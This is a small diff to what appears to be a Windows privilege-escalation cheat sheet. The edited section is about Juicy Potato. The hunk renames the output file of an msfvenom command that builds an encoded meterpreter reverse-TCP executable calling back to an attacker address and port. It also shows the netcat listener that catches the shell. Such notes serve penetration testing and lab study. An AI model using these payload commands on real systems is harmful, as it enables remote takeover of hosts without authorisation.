@@ -325,7 +325,7 @@ FOR /F %%i IN (CLSID.list) DO (
 ##### Get the Potato and execute it:
 * https://github.com/k4sth4/Juicy-Potato
   
-```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe```
+```msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o m.exe```
 
 ```nc -lvnp 4443```
 
